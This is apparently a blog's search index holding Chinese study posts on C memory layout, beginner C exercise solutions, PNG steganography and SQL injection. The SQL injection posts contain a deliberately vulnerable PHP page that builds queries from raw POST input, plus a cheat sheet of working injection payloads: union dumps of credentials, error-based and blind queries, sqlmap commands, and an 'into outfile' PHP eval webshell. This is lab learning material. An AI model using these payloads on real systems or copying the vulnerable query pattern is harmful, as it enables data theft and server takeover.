<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[内存四区的理解]]></title>
    <url>%2F2017%2F09%2F08%2F1%2F</url>
    <content type="text"><![CDATA[蚕丛及鱼凫，开国何茫然。 前言内存四区，之前学C语言的时候，就模模糊糊的看了一下，也没有很仔细的琢磨，后来学PHP和Java在看一些视频的时候，就看到了那些培训的老师，都对这些讲述的很细。有必要系统的总结一下啦，不然底层都弄不好，还怎么学习啊。这里就懒得去找其他语言的例子来讲了，就用C语言来讲一下吧。 入门案例 详解内存四区图解内存四区 内存四区介绍栈区由编译器自动分配释放, 存放函数的参数值,局部变量等. 例如: 参数buf,参数bufsize和size都是存放在栈区.当函数执行完毕的时候,自动释放 void recev(char* buf, int bufsize){ int size; } 堆区一般由程序员分配释放(动态内存申请与释放),若程序员不释放,程序结束时可能由操作系统回收 例如:下面的src所指向的内存空间就是在堆区 char* src = (char*) malloc(sizeof(buf) * sizeof(10)); 全局区(静态区、常量区)全局变量和静态变量存放在此. 里面细分有一个常量区, 字符串常量和其他常量也存放在此. 该区域是在程序结束后由操作系统释放. 程序代码区这个区域存放函数体的二进制代码.也是由操作系统进行管理的 划分内存四区的意义C语言程序中,根据是局部变量,全局变量, 常量还是通过malloc等类似的函数分配内存空间, 把他们放到对应的内存区中.这样就赋予了这些变量或常量不同的生命周期, 不同的释放方式. 根据我们程序的需要,我们在编码过程中,声明不同的变量类型, 使他们有不同的声明长度, 不同的释放方式,给我们更大的灵活编程 理解时出现的疑问关于栈内存的进栈顺序正如入门案例图上所示，都是操作系统或者某函数的状态在最下面，接下来是返回地址。程序读取的时候，按道理难道不应该是从main函数依次往下读取，最后才能读取到返回值么？ 答标准解释执行双击的时候，是操作系统将软件加载到内存。操作系统的可执行程序也是提前加载到内存的。操作系统找到main函数入口，开始执行。操作系统将应用程序分成四个区：代码区，堆区，栈区和全局区。在网上找到这个图 更加通俗的说法：说法一： 图上main函数橙色的区域：这4块内容，在main函数执行结束之后，是先后一起弹出来的。局部变量和形参弹出来之后就丢弃了，可以视为扔掉了。返回地址和其他现场信息（运行状态信息）弹出来之后会被送到CPU或者其他相关芯片或者某些变量中，以便恢复到该程序被调用之前的状态。 说法二： 相当于现场信息是对刚开始的操作系统的运行状态拍快照，程序结束后，从main函数的栈区里面把这个快照取出来，然后去恢复环境，把环境恢复为原来调用之前操作系统的各方面的样子。 说法三：打一个比方：比如你现在正在数钱，数到第320张的时候，用户来找你，让你去执行他的main函数。你怎么办？ 你只有一个办法，放下手里的活，去执行。但是，执行完了之后，等你回来，难道你要重新开始数钱么？当然不会。这个时候，最聪明的做法，就是，在你转去执行main之前，先记录一下你现在数了多少张，并且卡一个书签在数过及没数过的钱之间。 这个书签，就是返回地址。你回来之后，从这个位置开始继续往下数钱。这个记录下来的已数过钱的数额，就是所谓的现场信息。 在操作系统中，没有书签这个东西。他们会记录下一些当时cpu跳转之前，周围一些必要的数据信息，以便于回来之后继续执行 而这些信息，它是带到了main的栈区里面去保存的。 在执行main函数时，它会放心大胆滴修改cpu各个寄存器的值。各条总线的值，各个开关的值。 等执行完程序，回来之后，它会按照栈区里面弹出来的这个现场信息的内容，去恢复现在的现场，恢复成调用之前的样子，然后继续作后面的事。 关于内存泄漏内存泄漏的原理内存泄露的原理，当我们再堆区中分配的内存如果没有手工释放，程序结束后会把栈中的内存回收释放，该栈中保存了一个指向堆区元素的指针。然而这个指针一旦释放了后，就再也没有元素指向堆区的那块元素，然而堆区中的那块元素又没有释放，这自然而然的造成了内存泄露。 垃圾对象回收几种语言的比较C和C++没有垃圾回收机制，所以一旦malloc之后的空间不再使用，成为垃圾之后，需要程序员自己去调用free函数来释放空间。 PHP 销毁资源使用析构函数。析构函数是在对象被销毁时自动释放的，不需要调用。 JAVA （因为自己还没有学到JAVA的垃圾回收，只能通过网上的这些资料，等学到了，再用自己的语言总结一下） Java中的垃圾回收与对象生命周期 堆内存在JVM启动的时候被创建，堆内存中所存储的对象可以被JVM自动回收，不能通过其他外部手段回收，也就是说开发人员无法通过添加相关代码的手段来回收堆内存中的对象。堆内存通常情况下被分为两个区域：新对象区域与老对象区域。 新对象区域：又可细分为三个小区域：伊甸园区域、From区域与To区域。伊甸园区域用来保存新创建的对象，它就像一个堆栈，新的对象被创建，就像指向该栈的指针在增长一样，当伊甸园区域中的对象满了之后，JVM系统将要做到可达性测试，主要任务是检测有哪些对象由根集合出发是不可达的，这些对象就可以被JVM回收，并且将所有的活动对象从伊甸园区域拷贝到To区域，此时一些对象将发生状态交换，有的对象就从To区域被转移到From区域，此时From区域就有了对象。上面对象迁移的整个过程，都是由JVM控制完成的。 老对象区域：在老对象区域中的对象仍然会有一个较长的生命周期，大多数的JVM系统垃圾对象，都是源于”短命”对象，经过一段时间后，被转入老对象区域的对象，就变成了垃圾对象。此时，它们都被打上相应的标记，JVM系统将会自动回收这些垃圾对象，建议不要频繁地强制系统作垃圾回收，这是因为JVM会利用有限的系统资源，优先完成垃圾回收工作，导致应用无法快速地响应来自用户端的请求，这样会影响系统的整体性能。]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SYC基础C语言(A~P)writeup]]></title>
    <url>%2F2017%2F09%2F07%2FSYC%E5%9F%BA%E7%A1%80C%E8%AF%AD%E8%A8%80-A-P-writeup%2F</url>
    <content type="text"><![CDATA[慈母手中线，游子身上衣。 前言不知不觉暑假已经过去了，更加恐怖的是，我已经开学了几天了，开学这几天在做SYC上面的C语言，一个原因是受人所托，二呢，一个暑假都没有看过写过C了，自己有好多都忘记了。而且做的时候，发现上学期学的C真的很基础，很简单，很多C里面的东西都没有学到，就正好get一些新的知识啦~ 编程题是根据字母（A~Z）分类的，后面5道是给学长做的（哇，学姐就不能做了么，抠鼻），但是好吧，我自己觉得前面(A~P)才是属于基础一些的题目，所以写的WP就从P开始分类吧。 题目和代码说明这里面的题基本都用了一个相同的点，也是我之前没见过的，就是你没说停下，就可以一直输入。大概是长这个样子 未给定行数的用while(scanf(它的参数)!=EOF)处理 然后那种简单的题目，就不贴思路了~有些题目有很多种方法，就直接写在下面注释了，也是可以用的~ A-ASCII码排序#include &lt;stdio.h&gt; int main (void) { char s[3],m,x,y,z; while (scanf(&quot;%s&quot;,s)!=EOF) { x=s[0]; y=s[1]; z=s[2]; if(x&gt;y) { m=x; x=y; y=m; } if(x&gt;z) { m=x; x=z; z=m; } if(y&gt;z) { m=y; y=z; z=m; } printf(&quot;%c %c %c\n&quot;,x,y,z); } return 0; } /*{ if(x&gt;z &amp;&amp; y&gt;z) { printf(&quot;%c %c %c\n&quot;,z,x,y); } else if(x&lt;z &amp;&amp; y&gt;z) { printf(&quot;%c %c %c\n&quot;,x,z,y); } else if(x&lt;z &amp;&amp; y&lt;z) { printf(&quot;%c %c %c\n&quot;,x,y,z); } } fflush(stdin);//清除输入缓冲区*/ /* char m,x,y,z; while (scanf(&quot;%c%c%c&quot;,&amp;x,&amp;y,&amp;z)!=EOF) { fflush(stdin); if(x&gt;y) { m=x; x=y; y=m; } if(x&gt;z) { m=x; x=z; z=m; } if(y&gt;z) { m=y; y=z; z=m; } printf(&quot;%c %c %c\n&quot;,x,y,z); */ B-计算两点间的距离#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;math.h&gt; int main (void) { double x1,y1,x2,y2; double length; while(scanf(&quot;%lf%lf%lf%lf&quot;,&amp;x1,&amp;y1,&amp;x2,&amp;y2)!=EOF) { length=sqrt((x1-x2)*(x1-x2)+(y1-y2)*(y1-y2)); printf(&quot;%.2lf\n&quot;,length); } return 0; } C-计算球的体积#include &lt;stdio.h&gt; #define PI 3.1415927 int main(void){ double r,v; while(scanf(&quot;%lf&quot;,&amp;r)!=EOF) { v=((r*r*r)*4*PI)/3; printf(&quot;%.3lf\n&quot;,v); } return 0; } D-求绝对值#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;math.h&gt; int main (void) { double x; while (scanf(&quot;%lf&quot;,&amp;x)!=EOF) { printf(&quot;%.2lf\n&quot;,fabs(x)); } return 0; } E-Digital Roots思路这个题一开始没有做，因为可能是懒吧，不想看英语，然后强迫症觉得少了一个题，很不开心，就硬着头皮把他读下来了题意：把输入的数每个位上的数相加，一直加到只剩一个数为止eg：39 3+9=12 1+2=3 这个题目有坑哦~因为这题测试数据可能会很长，所以不能一位一位数字来取，又想到用字符串的方式处理。 代码#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char str[10000]; int sum; int i; while (scanf(&quot;%s&quot;, str) != EOF) { if(str[0]==&apos;0&apos;) { break; } sum = 10; while (sum &gt;= 10) { sum = 0; for (i = 0; str[i] != 0; i++) { sum += str[i] - &apos;0&apos;; } sprintf(str, &quot;%d&quot;, sum); } printf(&quot;%d\n&quot;, sum); } return 0; } 新知识在这里新学会了一个sprintf 的运用贴一个链接sprintf的运用 #include&lt;stdio.h&gt; int main(void) { char s[40]; sprintf(s,&quot;%s%d%c&quot;,&quot;test&quot;,1,&apos;2&apos;); //存到字符串里面去了 /*第一个参数就是指向要写入的那个字符串的指针，剩下的就和printf()一样了 //可以比较一下，这是向屏幕输入 // printf(&quot;%s%d%c&quot;,&quot;test&quot;,1,&apos;2&apos;); printf(&quot;%s&quot;,s); return 0; } 因此上面的代码可以简化成为这样（然而，这个代码我没有扔到题目上，只是本地测试了一下，是可以的） #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main (void) { char s[1000]; int sum,i; while (scanf(&quot;%s&quot;,s) != EOF) { if(strcmp(s,&quot;0&quot;) == 0) { break; } sum =10; while (sum &gt;= 10) { sum =0; for (i=0;s[i] != &apos;\0&apos;;i++) { sum+= s[i] - &apos;0&apos;; if(sum &gt; 9) { sum=sum%10+sum/10; } } //sprintf(s, &quot;%d&quot;, sum);//真的很方便啊！ } printf(&quot;%d\n&quot;,sum); } return 0; } F-求奇数的乘积#include &lt;stdio.h&gt; int main(void) { int n,num[100],i; int res; while (scanf(&quot;%d&quot;,&amp;n) != EOF) { res = 1; for(i=0;i&lt;n;i++) { scanf(&quot;%d&quot;,&amp;num[i]); if(num[i]%2!=0) { res*=num[i]; } } printf(&quot;%d\n&quot;,res); } return 0; } G-数值统计#include &lt;stdio.h&gt; int main(void) { int n,i; double a[100]; int num1,num2,num3; while (scanf(&quot;%d&quot;,&amp;n)!= EOF) { num1=0;num2=0;num3=0; if(n==0) { break; } for (i=0;i&lt;n;i++) { scanf(&quot;%lf&quot;,&amp;a[i]); if(a[i] ==0) { num2++; } else if(a[i] &lt;0 ) { num1++; } else if(a[i]&gt;0) { num3++; } } printf(&quot;%d %d %d\n&quot;,num1,num2,num3); } return 0; } H-多项式求和思路一开始把题目都看错了，以为都是加，还说怎么一直都没有正确答案，后来才看到自己题目都理解错了。既然有加有减，那肯定和（-1）的n次方有关了啊 代码#include &lt;stdio.h&gt; int main(void) { int m=-1; int n,i,j; int num[100]; double sum; while (scanf(&quot;%d&quot;,&amp;n) != EOF) { for(i=0;i&lt;n;i++) { scanf(&quot;%d&quot;,&amp;num[i]); sum=0; m=-1; for (j=1; j&lt;=num[i]; j++) { m = m*(-1); sum = sum+ m*(1.0/j); } printf(&quot;%.2lf\n&quot;,sum); } } return 0; } 新知识这里学了一个关于A的B次方的C语言用法 利用math.h中的pow（）函数进行：函数定义如下： double pow(double x,double y) 可以实现x的y次幂（返回值） example： #include &lt;stdio.h&gt; #include &lt;math.h&gt; int main() { printf(&quot;%f&quot;,pow(2,3)); return 0; } I-蟠桃记思路这个题开始我想用递归做的，后来觉得这样太麻烦了，可以直接倒推回去（剩下的桃子+1）*2 就是上一天的桃子啊 代码#include &lt;stdio.h&gt; int main(void) { int n,sum,i; while (scanf(&quot;%d&quot;,&amp;n) != EOF) { sum=1; for(i=1;i&lt;n;i++) { sum=(sum+1)*2; } printf(&quot;%d\n&quot;,sum); } return 0; } J-Encoding题意就是计算出现相同字母的次数，1的时候不用标注 代码#include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;math.h&gt; int main(void) { int n,i,num; char str[10000]; int length; scanf(&quot;%d&quot;,&amp;n); while(n--) { num=1; scanf(&quot;%s&quot;,str); length=strlen(str); for(i=0;i &lt; length;i++) { if(str[i]==str[i+1]) { num++; } else { if(num&lt;=1) { printf(&quot;%c&quot;,str[i]); num=1; } else { printf(&quot;%d%c&quot;,num,str[i]); num=1;//一定记得为1，不然后面出问题 } } } printf(&quot;\n&quot;); } return 0; } K-字符串统计#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(void) { int n,i; int num; char s[1000]; scanf(&quot;%d&quot;,&amp;n); while (n--) { scanf(&quot;%s&quot;,s); num=0; for(i=0;i&lt;strlen(s);i++) { if(s[i] &gt;=&apos;0&apos; &amp;&amp; s[i] &lt;=&apos;9&apos;) { num++; } } printf(&quot;%d\n&quot;,num); } return 0; } L-数列有序！####注意这个题应该是可以采取折半查找的，做的时候没有想到。实在是不应该。这个题用的是冒泡排序 代码#include &lt;stdio.h&gt; int main(void) { int n,m,i,j; int a[100]; int temp; while (scanf(&quot;%d%d&quot;,&amp;n,&amp;m)!=EOF) { if(n==0 &amp;&amp; m==0) { break; } else { for(i=0;i&lt;n;i++) { scanf(&quot;%d&quot;,&amp;a[i]); } a[n]=m; for(i=0;i&lt;n+1;i++) { for (j=0;j&lt;n;j++) { if(a[j]&gt;a[j+1]) { temp=a[j]; a[j]=a[j+1]; a[j+1]=temp; } } } for (i=0;i&lt;n+1;i++) { if(i==n) { printf(&quot;%d&quot;,a[i]); } else { printf(&quot;%d &quot;,a[i]); } } printf(&quot;\n&quot;); } } return 0; } M-求平均成绩#include &lt;stdio.h&gt; #include &lt;math.h&gt; int main(void) { int n,m,sum,count,i,j,flag; int a[50][50]; double ave1[50],ave2[50]; while (scanf(&quot;%d%d&quot;,&amp;n,&amp;m) != EOF) { for (i=0;i&lt;n;i++) { for (j=0;j&lt;m;j++) { scanf(&quot;%d&quot;,&amp;a[i][j]); } } //每个人平均成绩 for(i=0;i&lt;n;i++) { sum=0; for(j=0;j&lt;m;j++) { sum+=a[i][j]; } ave1[i]=(sum*1.0)/m; } //每门课的平均成绩 for(j=0;j&lt;m;j++) { sum=0; for(i=0;i&lt;n;i++) { sum+=a[i][j]; } ave2[j]=(sum*1.0)/n; } //这里比较的时候一定要注意，他是成绩每一科目都要比较，但是是一个人 count=0; for(i=0;i&lt;n;i++) { flag=0; for(j=0;j&lt;m;j++) { if(a[i][j]&gt;=ave2[j]) { flag++; } if(flag==m-1) { count++; } } } /* 第二种方法 count=0; for(i=0;i&lt;n;i++) { flag=1; for(j=0;j&lt;m;j++) if(a[i][j]&lt;ave2[j]) { flag=0; break; } if(flag) count++; }*/ for(i=0;i&lt;n;i++) { if(i==n-1) printf(&quot;%.2lf\n&quot;,ave1[i]); else printf(&quot;%.2lf &quot;,ave1[i]); } for(i=0;i&lt;m;i++) { if(i==m-1) printf(&quot;%.2lf\n&quot;,ave2[i]); else printf(&quot;%.2lf &quot;,ave2[i]); } printf(&quot;%d\n\n&quot;,count); } return 0; } N-查找最大元素#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(void) { char s[100]; int i,j,len; char max; while (scanf(&quot;%s&quot;,s) != EOF) { len=strlen(s); max=&apos;a&apos;; for (i=0;i&lt;len;i++) { if(s[i]&gt;max) { max=s[i]; } } for (i=0;i&lt;len;i++) { if(s[i]==max) printf(&quot;%c(max)&quot;,s[i]); else printf(&quot;%c&quot;,s[i]); } printf(&quot;\n&quot;); } return 0; } O-Text Reverse题意字符串以一个空格为间隔，倒序排列。Sample Input 3 olleh !dlrow m&apos;I morf .udh I ekil .mca Sample Output hello world! I&apos;m from hdu. I like acm. 思路将空格提取出来，空格以前的字符串存储起来，再进行倒序。注意输入的换行要读取了，不然会出错 #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(void) { int n,i,j,len,k; char s1[1000]; scanf(&quot;%d&quot;,&amp;n); getchar();//换行 while(n--) { gets(s1); len=strlen(s1); for (i=0,j=0;i&lt;len;i++) { if(s1[i]==&apos; &apos;)//要用单引号 而不是双引号 { for(k=i-1;k&gt;=j;k--) { printf(&quot;%c&quot;,s1[k]); } printf(&quot; &quot;); j=i+1; } } for(k=len-1;k&gt;=j;k--)//最后一个单词的输出 { printf(&quot;%c&quot;,s1[k]); } printf(&quot;\n&quot;); } return 0; } P-人见人爱A^B####注意这个题要注意int的溢出问题如果我们只是采用一直算的话，不能找到一个数据类型来储存这个数，因此，这个办法是不行的。我们知道，要知道一个幂的后三位，只需要对这个数一直%1000即可，比如1230%1000=230；2323456789%1000=789……这样我们这个问题就简单了，只要每次乘以一个数对1000取余即可。 代码#include&lt;stdio.h&gt; int main() { int a,b,s,i; while(scanf(&quot;%d%d&quot;,&amp;a,&amp;b)!=EOF) { if(a==0&amp;&amp;b==0) break; s=a; for(i=1;i&lt;b;i++) { s=(s*a)%1000; } printf(&quot;%d\n&quot;,s); } return 0; } 后记磨蹭了几天把前面的题写了。后面的题写了几道，发现有些需要数据结构的知识，只能边学边写了。这里只恨自己不会python，因为平台13号就要关闭了，要是可以自己爬下来多练习练习就好了。而且很多这些代码都没有考虑代码的健壮性。就只能勉强说暂且作为复习C用吧。这些题目也是一些很基础的ACM题目吧，现在平台第一名是一个对ACM很感兴趣的人，和他交流之后，更加提升了我对算法的兴趣，想这学期结合一下数据结构学习一些算法吧。 反思1.调试进入函数内部问题2.循环的时候，定义的变量到底是在循环内（循环内，每次循环就要重新被赋值，要想清楚）3.换行，空格这些字符，要注意清除缓存fflush(stdin);或者getchar();4.学到的新知识 1）E题型的sprintf的运用 2）H题型想到的关于A的B次方的C语言用法]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ACM</tag>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端验证sql]]></title>
    <url>%2F2017%2F08%2F25%2F%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81sql%2F</url>
    <content type="text"><![CDATA[夜如何其？夜未央 写了一个前端验证，html也忘记了，页面写的很粗略，将就看一下，毕竟是我人生第一个自己写的漏洞。 主界面，省略掉测试他是否有漏洞。 id处输入： 1’ or 1=1# 省略中间步骤，直接爆一下东西： 输入：1’ and 1=2 union select 1,2,group_concat(username,0x3a,password) from user# 这里贴一下我的代码： &lt;html&gt; &lt;head&gt; &lt;title&gt;M3tar的第一个注入&lt;/title&gt; &lt;meta http-equiv=&quot;content-type&quot;content=&quot;text/html&quot;charset=&quot;Unicode&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;M-star.php&quot; method=&quot;post&quot;&gt; &lt;h1&gt;Sql注入&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;id&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;用户名&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密 码&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php if($_POST){ $con=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;m3tar&quot;,$con); $id = $_POST[&apos;id&apos;]; $sql=&quot;select * from user where id=&apos;$id&apos;&quot;; $query=mysql_query($sql,$con); $arr=mysql_fetch_array($query, MYSQL_ASSOC); if(!empty($arr)){ echo &apos;&lt;pre&gt;&apos;,print_r($arr,1),&apos;&lt;/pre&gt;&apos;; }else{ echo &quot;输入有误&quot;; } } ?&gt; 关于写代码学到的一点点心得： 1）php：写这个还是要对php有那么一点点的了解，对于数据库编程的内容也要有一些了解： 数据库的三层结构：客户端 mysql dbms 数据对象 2）可以总结一下mysql扩展库操作mysql数据库的步骤 3）关于phpstudy的理解： 以前只是下了phpstudy，知道往WWW下扔东西，才知道还可以秒切换版本，很不错的功能，希望以后能多加应用。因为写一==这个个简单的sql注入漏洞的界面，emmm，很难受，写不来数据库，百度了半天，很瓜，原来phpstudy里面就可以新建数据库（phpMyadmin、Mysql-front），赶紧照着百度依葫芦画瓢，第一次接触这个自己后台的数据库，非常的兴奋。还有其他问题，现在还没有怎么遇到，以后再补充。 4)html和css感觉白学了，都记不得了，要抓紧时间补足啊。 5）POST和GET参数分别的优势和劣势 http://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html 详细的可以看这个资料]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sql学习</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基础sql总结]]></title>
    <url>%2F2017%2F08%2F25%2F1%2F</url>
    <content type="text"><![CDATA[我与世界相遇，我自与世界相蚀，我自不辱使命，使我与众生相聚。摘要：总结一些基础的sql语句。 SQL注入原理&nbsp;&nbsp;它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 SQL注入分类&nbsp;&nbsp;sql注入分类主要还是分为数字型注入和字符型注入。至于说的post注入，cookie注入，http头注入，盲注···个人觉得都是可以分开囊括在里面的，只是这些是根据注入字段在的位置进行的命名。 下面就讲一些学到现在我见过的的注入分类吧。 GET注入 POST注入 http头注入 cookie注入 报错的注入 布尔盲注 基于时间的盲注 注入基本操作 （GET注入为例）第一步：判断是否存在注入GET注入一般看源代码就可以看到。形如：$_GET[“ID”] ID就是参数 以id为例： 1） url ? id=1 返回正常 2） url ? id=1’ 出错，页面异常 3） url ? id=1 and 1=1 返回正常 4） url ? id=1 and 1=2 返回错误 以上步骤满足，可能存在SQL注入漏洞 总结： 出现过的SQL语句总结： （不构造那种双闭合语句，一定记得注释 –+ 或者 #） 1）select * from table where id = &apos;input&apos; 2) select * from table where id = (&apos;input&apos;) 3) select * from table where id = (&quot;input&quot;) 4) select * from table where id = (input) 第二步： 找到注入点，进行基础的sql语句尝试：（以下是用GET注入为例的） 第一步：用 order by 来爆字段数，如果没有反应，则在后面加–+或者/*或者#注释掉后面的内容 http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=1&apos;)) order by 5 --+ 第二步：显示错误位，and 1=2 union select 1,2,3,4,5,6，…..（这一步一定记得前面必须输入错误的，才能爆出敏感信息） http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=-1&apos; union select 1,2,3--+ 爆库:select SCHEMA_NAME from information_schema.SCHEMATA limit 5,1 第三步：显示版本，当前用户，数据库路径， 1） and 1=2 union select 1,2,group_concat(version(),0x3a,user(),0x3a,@@datadir),4 2） and 1=2 union select 1,2,database() 第四步：爆表 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 第五步：爆列 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;表名的hex&apos; （&apos;users&apos;）--+ 第六步： 爆字段 and 1=2 union select 1,2,group_concat(username,0x3a,password) from 表名 (不用单引号）--+ POST注入 解决方式：burpsuite + sqlmap最简单的比如：前端验证， 直接绕过即可 这里详细讲述一下利用sqlmap解决的办法： 1）抓包，最后一行就是参数值sqlmap -u &quot;url&quot; --data &quot;参数（就是最后一行）&quot; --risk=3 --level=5 --dbs 2）将抓包得到的post请求复制为txt 注意：在kali里面新建文件夹后使用vim vim使用方法： vim 1.txt 回车 粘贴内容 esc键:wq 回车 运行sqlmap并使用如下命令（ 括号里面可以不写 ）： ./sqlmap -r search-1.txt (-p 参数) 或者： sqlmap -r &quot;1.txt&quot; -p &quot;参数&quot; --dbs 这里参数 -r 是让sqlmap加载我们的post请求1.txt，而-p 应该比较熟悉，指定注入用的参数(如果没写，就会自己检测的) 3）自动搜索表单sqlmap -u url --forms HTTP头注入基本上http头都有可能出现能注入的地方。推荐阅读这个链接http头注入 cookie注入cookie注入，这里主要讲解一下利用sqlmap，因为手工的cookie注入，现在我还没遇到，遇到之后在做补充。 基本用法：&nbsp;&nbsp;这里要进行cookie注入，就要先注册，然后F12 就出现一个cookies 就可以进行cookie注入 相关语句 网上的相关资源 命令1跑表 sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --table --level 2 命令2字段 sqlmap -u &quot;URL&quot; --cookie &quot;参数&quot; --columns -T 表段 --level 2 命令3跑密码 sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --dump -T 表段 -C “字段，字段” --level 2 报错的注入步骤1)猜测注入语句，不再赘述. 2)语句测试，当使用 1’union selcet 1,2,3 –+ 返回还是正常页面，因此我们要利用报错信息 3) 1′ and ( select 1 from (select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name)b)–+ 含义：取名concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))为name，count()name的个数，这时候会报错，从而爆出database()的值，’~’的用途在于方便识别。 整个语句分析： 整体相当于select 1 from b； 其中b = select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name ，count()name的个数； name=concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2)) 4） 进行注入 语句构造： 1′and (select 1 from (select count(),(concat(“~”,(select 报错语句),”~”,floor(rand()2)))name from information_schema.tables group by name)b) 解释语句 floor() 是取整数 rand()在0和1之间产生一个随机数 rand(0)*2 将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2) 记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*) 是用来统计结果的，相当于刷新一次结果 group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1 在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次 个人常用的基于错误的语句1./*爆表库*/(select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆表库*/ 2./*爆当前(select 1 from (select count(*),(concat(“~”,current_user,”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆当前用户名*/ 3./*爆所有用户名*/(select 1 from (select count(*),(concat(“~”,(select username from users limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆所有用户名*/ 布尔盲注1)布尔盲注出现的情况当出现无论输入任何语句页面只有两种情况的时候，即只存在正确页面和错误页面时，而不显示报错信息，这样我们就需要进行布尔盲注。通过猜测目标字符串字符的ascii码来确定字符，但该过程非常繁琐，自动化工具更方便一些。 2)语句构造1’ and (ascii(substr(database(),1,1)))&gt;100 –+ 返回正确页面说明该范围正确，返回错误页面相当于范围不正确，最后用等号确定。 基于时间的盲注1)基于时间的盲注出现的情况这种情况下就是所有语句下页面只存在正确的一种，这样就用到了基于时间的盲注，原理是如果正确就执行sleep()函数，使程序挂起，这样我们就可以知道语句正确还是错误了。一般使用sleep(5)，使程序挂起5秒钟。 2)语句构造1′ and (select if (ascii(substr(database(),1,1))&gt;100,sleep(5),NULL)) –+ 数据库名称第一个字符的ascii码是否大于100，正确则产生5s的延迟，错误则返回空。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。 也有benchmark()延时注入，与sleep用法相似。 其他一句话提权等直接写一句话(要知道物理路径) ，连接菜刀 and 1=2 union select 1,2,&apos;&lt;?php @eval($_post[&quot;mima&quot;]) ?&gt;&apos;,4 into outfile &apos;D:\\xampp\\www\\test.php&apos; --+ 记住一定要用两个反斜杠，用一个的话可能会出现转义 中间插入如果强行要在1，**，3中插入 语句这样构造： 爆表： id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;database&apos; --+ 一些语句的解释1.group_concat的意思是全部列出来 2.version()——MySQL版本 3.concat(str1,str2…)——没有分隔符地连接字符串 4.concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 5.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据 6.0x3a是”:”的十六进制，在这里把它作为分隔符]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sql学习</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[png图片隐写]]></title>
    <url>%2F2017%2F08%2F22%2F1%2F</url>
    <content type="text"><![CDATA[前尘隔海，古屋不再。 &nbsp;&nbsp;这是之前做一道图片隐写题目学到的东西，补充一下之前的写图片隐写术。 考察内容1.LSB隐写 2.图片修复题目图片 知识储备扔一下相关学习的网站： 世安杯-LSB隐写-png：http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1 CTF之隐写：http://www.jianshu.com/p/02fdd5edd9fc 隐写术总结：http://bobao.360.cn/learning/detail/243.html stegsolve的用法：Stegsolve——Analyse——Frame Browser。浏览每个颜色通道的每一位，看是否隐藏了二维码（二维码在线解码：http://tool.chinaz.com/qrcode/） Stegsolve——Analyse——Data Extract。这个是使用ASCII隐写的时候可以查看的。 Stegsolve——Analyse——file format。查看文件格式，结合IDAT结构是否异常，结合编程。 Stegsolve——Analyse——frame browser。可以查看GIF文件每一帧的图片。 Stegsolve——Analyse——image combiner双图分析 